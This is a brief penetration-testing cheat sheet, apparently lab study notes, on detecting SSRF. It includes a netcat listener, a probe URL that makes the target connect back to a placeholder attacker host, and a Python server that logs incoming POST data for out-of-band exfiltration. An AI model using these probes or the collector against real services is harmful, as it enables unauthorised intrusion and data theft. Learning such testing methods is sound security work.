# SSRF

## TABLE OF CONTENT
- **[Server-side Request Forgery](#server-side-request-forgery)**
- **[lind SSRF](#blind-ssrf)**
- **[Time-based SSRF](#time-based-ssrf)**

### Server-side Request Forgery
- To check if the application is vulnerable

```
1. Set up Netcat listener: nc -lnvp 5555
2. Try to connect back to our server. 
https://example.com/load?q=http://$ATTCKER:5555
3. If the connectino is established, the target is vulnerable to SSRF
```

### Blind SSRF
- Similar to regular SSRF, except that there's no information display on the front end. So we have to check.

```
1. Set up Netcat listener: nc -lnvp 5555
2. Upload file that can create connections to our machine
3. If the connection is established, the target is vulnerable.
```

### Time-based SSRF
- We can try to have the target to request resources and check the time it responds in BurpSuite. If the requested resources are invalid and it takes the applications way longer to respond, we can confirm the vulnerability

### Out-of-band SSRF
Create a server on Attacking Machine `server.py`

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

